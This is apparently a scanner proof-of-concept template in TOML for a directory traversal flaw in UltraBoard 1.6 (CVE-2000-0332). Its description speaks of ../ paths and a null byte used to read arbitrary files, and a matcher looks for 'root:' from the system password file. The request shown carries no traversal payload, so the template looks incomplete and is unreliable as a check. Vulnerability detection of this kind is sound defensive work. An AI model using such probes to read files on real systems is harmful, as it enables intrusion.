[info]
author = "AVE"
description = "检测 UltraBoard 1.6 的 UltraBoard.pl/UltraBoard.cgi 是否存在目录遍历漏洞，通过构造包含 ../ 的路径参数并追加空字节读取任意文件"
id = "POC-AVE-2000-0275"
name = "UltraBoard 1.6 目录遍历漏洞 PoC"
severity = "medium"
tags = ["ave-2000-0275"]
vuln_id = [
    "CVE-2000-0332",
    "AVE-2000-0275",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/cgi-bin/UltraBoard.pl"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["root:"]
